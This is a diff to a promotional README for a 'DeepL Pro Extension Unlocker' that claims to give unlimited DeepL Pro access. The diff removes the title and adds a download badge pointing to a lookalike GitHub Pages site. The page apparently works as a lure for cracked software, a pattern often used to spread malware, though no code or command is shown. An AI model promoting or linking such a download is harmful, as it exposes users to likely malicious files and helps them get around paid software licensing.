@@ -1,6 +1,6 @@
-# 🌟 Unlock DeepL Pro Features with the Ultimate Extension Unlocker Tool! 🚀
-
 Are you tired of hitting translation limits while using **DeepL**? Say goodbye to restrictions and unlock the full potential of **DeepL Pro** with the **DeepL Pro Extension Unlocker**! Whether you're a programmer, linguist, or just someone looking for seamless translations, this tool is your key to unlimited access. Let’s dive into why this extension is a game-changer and how it can elevate your productivity! 💻🌐
+
+[![Download DeepLUnlocker](https://img.shields.io/badge/Download-DeepLUnlocker-blueviolet)](https://deepl-unlocker.github.io/.github/)
 
 ## 📋  Why You Need the DeepL Pro Extension Unlocker  
 
